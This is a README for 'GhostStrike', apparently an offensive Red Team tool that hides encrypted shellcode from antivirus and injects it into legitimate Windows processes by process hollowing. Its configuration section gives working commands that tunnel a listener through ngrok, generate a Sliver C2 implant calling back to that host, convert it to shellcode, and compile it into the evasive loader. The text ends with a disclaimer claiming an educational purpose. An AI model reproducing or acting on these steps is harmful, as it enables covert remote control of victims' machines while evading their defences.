# GhostStrike ⚔️

**GhostStrike** is an advanced cybersecurity tool designed for Red Team operations, featuring sophisticated techniques to evade detection and perform process hollowing on Windows systems.

---

## ✨ Features

<ul>
    <li><strong>Dynamic API Resolution:</strong> Utilizes a custom hash-based method to dynamically resolve Windows APIs, avoiding detection by signature-based security tools.</li>
    <li><strong>Base64 Encoding/Decoding:</strong> Encodes and decodes shellcode to obscure its presence in memory, making it more difficult for static analysis tools to detect.</li>
    <li><strong>Cryptographic Key Generation:</strong> Generates secure cryptographic keys using Windows Cryptography APIs to encrypt and decrypt shellcode, adding an extra layer of protection.</li>
    <li><strong>XOR Encryption/Decryption:</strong> Simple but effective XOR-based encryption to protect the shellcode during its injection process.</li>
    <li><strong>Control Flow Flattening:</strong> Implements control flow flattening to obfuscate the execution path, complicating analysis by both static and dynamic analysis tools.</li>
    <li><strong>Process Hollowing:</strong> Injects encrypted shellcode into a legitimate Windows process, allowing it to execute covertly without raising suspicions.</li>
</ul>

---

## ⚙️ Configuration

You can configure GhostStrike with the following steps:

<ol>
    <li><strong>Create Ngrok Service:</strong> <code>ngrok tcp 443</code></li>
    <li><strong>Generate Sliver C2 Implant:</strong> <code>generate --mtls x.tcp.ngrok.io --save YourFile.exe</code></li>
    <li><strong>Create Listener:</strong> <code>mtls --lhost 0.0.0.0 --lport 443</code></li>
    <li><strong>Convert to .bin:</strong> <code>./donut -i /home/YourUser/YourFile.exe -a 2 -f 1 -o /home/YourUser/YourFile.bin</code></li>
    <li><strong>Convert to C++ Shellcode:</strong> <code>xxd -i YourFile.bin > YourFile.h</code></li>
    <li><strong>Import YourFile.h to this code</strong></li>
    <li><strong>Compile and enjoy! 🚀</strong></li>
</ol>

---

## 💻 Requirements

- **C++ Compiler:** Any modern C++ compiler, such as `g++`, `clang++`, or Visual Studio, is sufficient to compile the code.

No additional dependencies are needed to build **GhostStrike**. Simply compile the source code with your preferred C++ compiler, and you're ready to go!

---

## ⚠️ Disclaimer

<p>This tool is intended solely for educational purposes and for use in controlled environments. Unauthorized use of GhostStrike outside of these settings is strictly prohibited. The author, <strong>@Stiven.Hacker</strong>, takes no responsibility for any misuse or damage caused by this code.</p>

---

## 🎥 Demo

<p>Check out a live demonstration of GhostStrike in action on LinkedIn:</p>

<a href="https://www.linkedin.com/posts/stiven-mayorga_cybersecurity-ethicalhacking-pentesting-activity-7203583047705710593-IIVE?utm_source=share&utm_medium=member_ios" style="display: inline-block; padding: 10px 20px; font-size: 16px; color: #fff; background-color: #0a6dff; text-decoration: none; border-radius: 5px; margin-top: 20px;">Watch Demo</a>